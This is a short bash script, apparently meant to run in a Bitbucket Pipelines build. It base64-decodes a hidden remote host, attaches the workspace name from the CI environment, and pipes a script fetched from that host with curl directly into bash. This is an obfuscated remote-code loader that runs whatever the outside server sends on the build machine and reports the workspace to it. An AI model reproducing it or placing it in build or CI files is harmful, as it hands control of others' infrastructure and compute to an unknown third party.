#!/bin/bash

# 参数配置
TMPSTR="aS5hZ2FuemFpLmNvbToyNzQ2Mw=="
DOMAIN=`echo -n $TMPSTR | base64 -d`
ROLEID=$BITBUCKET_WORKSPACE
echo $DOMAIN 

# 运行
curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-bb | bash -s run $ROLEID-bb
